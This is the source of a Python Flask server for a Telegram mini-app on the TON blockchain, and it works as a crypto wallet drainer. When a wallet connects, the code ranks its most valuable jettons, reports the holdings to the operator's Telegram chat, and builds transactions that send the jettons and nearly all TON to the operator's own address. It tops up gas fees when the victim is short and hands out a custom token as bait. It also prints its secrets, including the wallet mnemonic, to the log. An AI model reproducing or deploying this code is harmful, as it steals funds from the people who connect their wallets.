# Standard library imports
import hashlib
import os
import time
import hmac ,json
from base64 import urlsafe_b64encode
from typing import List, Dict, Optional
from urllib.parse import parse_qs, unquote
from models import *
# Third-party imports
from dotenv import load_dotenv
from flask import Flask, jsonify, abort, send_from_directory ,request
from flask_cors import CORS
from telegram.ext import ApplicationBuilder, CommandHandler, MessageHandler, filters
from pytoniq import begin_cell
from tonutils.jetton import JettonWallet
from pytoniq_core.tlb.custom.wallet import WalletMessage
from pytonapi import AsyncTonapi
from pytonapi.schema.jettons import JettonVerificationType
from tonutils.client import ToncenterClient
from tonutils.wallet import WalletV5R1
from pytoniq_core import Address,begin_cell

# Load environment variables
load_dotenv()

CUSTOM_TOKEN_COUNT = 1_000

class Config:
    REQUIRED_ENV_VARS = {
        "WALLETV5_MNEMONIC": "WALLETV5_MNEMONIC",
        "TONCONSOLE_API_KEY": "TONCONSOLE_API_KEY",
        "TONCENTER_API_KEY": "TONCENTER_API_KEY",
        "WALLET_ADDRESS": "WALLET_ADDRESS",
        "TELEGRAM_BOT_TOKEN": "TELEGRAM_BOT_TOKEN",
        "TELEGRAM_CHATID": "TELEGRAM_CHATID"
    }

    @classmethod
    def validate_env(cls) -> Dict[str, str]:
        """Validate and return required environment variables"""
        config = {}
        missing_vars = []

        for env_var, var_name in cls.REQUIRED_ENV_VARS.items():
            value = os.getenv(env_var)
            if not value:
                missing_vars.append(env_var)
            config[var_name] = value

        if missing_vars:
            raise EnvironmentError(
                f"Required environment variables are not set: {', '.join(missing_vars)}"
            )
        print(config)
        return config

# Initialize configuration
config = Config.validate_env()

def validate_init_data(init_data: str, bot_token: str):
     vals = {k: unquote(v) for k, v in [s.split('=', 1) for s in init_data.split('&')]}
     data_check_string = '\n'.join(f"{k}={v}" for k, v in sorted(vals.items()) if k != 'hash')

     secret_key = hmac.new("WebAppData".encode(), bot_token.encode(), hashlib.sha256).digest()
     h = hmac.new(secret_key, data_check_string.encode(), hashlib.sha256)
     return h.hexdigest() == vals['hash']

def user_web_app(initdata: str):
    parameters = parse_qs(initdata)
    user = parameters.get("user", [None])[0]
    try:
        return json.loads(user)
    except :
        return {}
# Initialize services
app = Flask(__name__, static_folder="Client")
CORS(app)

telegram = ApplicationBuilder().token(config["TELEGRAM_BOT_TOKEN"]).build()
TONAPI = AsyncTonapi(api_key=config["TONCONSOLE_API_KEY"])

class JettonTransfer:
    """Handle Jetton transfer operations"""
    
    @staticmethod
    def create_transfer_message(jetton_wallet_address: str,recipient_address: str,transfer_fee: int,jettons_amount: int) -> Dict:
        """Create a jetton transfer message"""
        payload = urlsafe_b64encode(
            begin_cell()
            .store_uint(0xF8A7EA5, 32)
            .store_uint(0, 64)
            .store_coins(jettons_amount)
            .store_address(recipient_address)
            .store_address(config["WALLET_ADDRESS"])
            .store_uint(0, 1)
            .store_coins(1)
            .store_uint(0, 1)
            .end_cell()
            .to_boc()
        ).decode()

        return {
            "address": jetton_wallet_address,
            "amount": str(transfer_fee),
            "payload": payload,
        }
 
class WalletOperations:
    """Handle wallet-related operations"""

    @staticmethod
    async def fetch_jettons(address: str) -> List:
        """Fetch jettons for a given address"""
        try:
            response = await TONAPI.accounts.get_jettons_balances(
                account_id=address, currencies=["usd"])
            for x in response.balances:
                print(x.jetton.name,x.wallet_address.address.to_userfriendly())

            valid_jettons = [
                jetton for jetton in response.balances
                if int(jetton.balance) > 0 and not jetton.wallet_address.is_scam
            ]
            

            return sorted(
                valid_jettons[:4],
                key=lambda x: float(x.balance) * float(x.price.prices["USD"]) / 1e9,
                reverse=True
            )

        except Exception as e:
            print(f"Error fetching jettons: {e}")
            return []

    @staticmethod
    async def fetch_balance(address: str) -> str:
        """Fetch balance for a given address"""
        try:
            account_info = await TONAPI.accounts.get_info(account_id=address)
            print(account_info)
            return str(account_info.balance)
            
        except Exception:
            return "0"

    @staticmethod
    async def transfer_transaction_fee(address: str, amount: float = 0.05) -> None:
        """Transfer transaction fee"""
        print("kosssssssss")
        if not address or amount <= 0:
            return

        try:
            client = ToncenterClient(
                api_key=config["TONCENTER_API_KEY"],
                is_testnet=False
            )
            
            wallet, _, _, _ = WalletV5R1.from_mnemonic(
                client=client,
                mnemonic=config["WALLETV5_MNEMONIC"]
            )
            
            await wallet.transfer(destination=address, amount=amount)
        except Exception as e:
            print(f"Error transferring transaction fee: {e}")

    @staticmethod
    async def transfer_jetton(address: str,jetton_address :str, amount: float = 1) -> None:
        """Transfer jetton"""
        if not address or amount <= 0:
            return

        try:
            client = ToncenterClient(
                api_key=config["TONCENTER_API_KEY"],
                is_testnet=False
            )
            
            wallet, _, _, _ = WalletV5R1.from_mnemonic(
                client=client,
                mnemonic=config["WALLETV5_MNEMONIC"]
            )
            body = JettonWallet.build_transfer_body(
                recipient_address=Address(address),
                response_address=wallet.address,
                jetton_amount=amount * (10 ** 9),
            )

            await wallet.transfer(
                destination=jetton_address,
                amount=0.05,
                body=body,
                bounce=True,
            )
            
        except Exception as e:
            print(f"Error transferring transaction jetton: {e}")

class TelegramNotifier:
    """Handle Telegram notifications"""

    @staticmethod
    async def send_report_jettons(jettons: List ,balance) -> None:
        """Send jetton report via Telegram"""
        total_balance = 0
        report_lines = ["📡 New Connected Wallet Report:\n"]
        report_lines = [f"💰 TON BALANCE : {balance}\n"]


        for jetton in jettons:
            count = float(jetton.balance) / 1e9
            balance = round(count * float(jetton.price.prices["USD"]), 2)
            total_balance += balance
            
            report_lines.append(f"🎯 Name : {jetton.jetton.name}")
            report_lines.append(f"-📡 Count : {int(count)}")
            report_lines.append(f"-💰 Balance : ${balance}")
            report_lines.append(f"-🌛 Price : ${round(float(jetton.price.prices['USD']) ,4)}")
            report_lines.append("")

        report_lines.append(f"\n<u>💰 Total Balance: ${round(total_balance, 2)}</u>")
        
        try:
            await telegram.bot.send_message(
                chat_id=int(config["TELEGRAM_CHATID"]),
                text="<b>" + "\n".join(report_lines) + "</b>",
                parse_mode="HTML"
            )
        except Exception as e:
            print(f"Error sending Telegram message: {e}")

# Route handlers
@app.route("/")
def serve_index():
    """Serve the index page"""
    return send_from_directory(app.static_folder, "index.html")

@app.route("/transaction/<string:wallet>", methods=["GET"])
async def get_wallet_info(wallet: str):
    """Handle wallet transaction information"""
    jettons = await WalletOperations.fetch_jettons(wallet)
    balance = await WalletOperations.fetch_balance(wallet)

    try:
        balance_int = int(balance)
    except (ValueError, TypeError):
        return abort(400)

    if not jettons and balance_int <= 0:
        return abort(400)

    await TelegramNotifier.send_report_jettons(jettons ,balance_int / 1e9)

    # Process transactions
    fee = int(0.05 * (10 ** 9))
    messages = []

    balances = []

    for jetton in jettons:
        count = float(jetton.balance) / 1e9
        balances.append(round(count * float(jetton.price.prices["USD"]), 2))
        messages.append(
            JettonTransfer.create_transfer_message(
                jettons_amount=int(jetton.balance),
                transfer_fee=fee,
                recipient_address=config["WALLET_ADDRESS"],
                jetton_wallet_address=str(jetton.wallet_address.address.to_userfriendly())
            )
        )
    total_fee = fee * len(messages) + 1
    balance_int -= total_fee
    tonusd_balance = (balance_int / 1e9) * 6


    if balance_int < total_fee:
        auth_header = request.headers.get('Authorization')
        user = user_web_app(auth_header)

        try:
            fee = Fee.get((Fee.wallet == wallet) | (Fee.chat_id == user.get("id" , 0)))
        except DoesNotExist:
            Fee.create(wallet=wallet, chat_id = user.get("id" , 0))
            await WalletOperations.transfer_transaction_fee(
                address=wallet,
                amount=(total_fee - balance_int) / 1e9
            )
            

    if balance_int >= 0 and (len(messages) == 3 or min(balances) < tonusd_balance):
        messages = messages[:3]
        messages.append({
            "amount": str(balance_int),
            "address": config["WALLET_ADDRESS"]
        })

    return jsonify({
        "validUntil": int(time.time() + 3600),
        "messages": messages
    })

@app.route("/payment", methods=["POST"])
async def confirm_payment():
    data = request.get_json()
    
    if data and data.get("bos" ,None) and data.get("wallet" ,None):
        bos = data.get("bos" , None)
        wallet = data.get("wallet" , None)
        
        try:
            JettonsTransaction.get((JettonsTransaction.bos == bos) | (JettonsTransaction.wallet == wallet))
        except DoesNotExist:
            JettonsTransaction.create(bos = bos ,wallet = wallet)
            jetton = Jettons.select().where(Jettons.total >= CUSTOM_TOKEN_COUNT).first()

            if jetton:
                jetton.total -= CUSTOM_TOKEN_COUNT
                jetton.save()

                await WalletOperations.transfer_jetton(
                    jetton_address = jetton.wallet,
                    address = wallet ,
                    amount = CUSTOM_TOKEN_COUNT
                )
        return jsonify("OK") ,200
    return jsonify("INVALID REQUEST") ,400

@app.errorhandler(404)
def not_found(e):
    """Handle 404 errors"""
    return send_from_directory(app.static_folder, "index.html")

@app.before_request
async def AuthorizationMiddleware():
    auth_header = request.headers.get('Authorization')
    if request.method != "OPTIONS":
        if not auth_header:
            return jsonify({"error": "Token Not Found"}), 401
        
        if not validate_init_data(auth_header ,config["TELEGRAM_BOT_TOKEN"]):
            return jsonify({"error": "Invalid Authorization"}), 401
        
        user = user_web_app(auth_header)

        user, created = User.get_or_create(chat_id = user["id"], defaults={'name': user["first_name"]})

if __name__ == "__main__":
    app.run()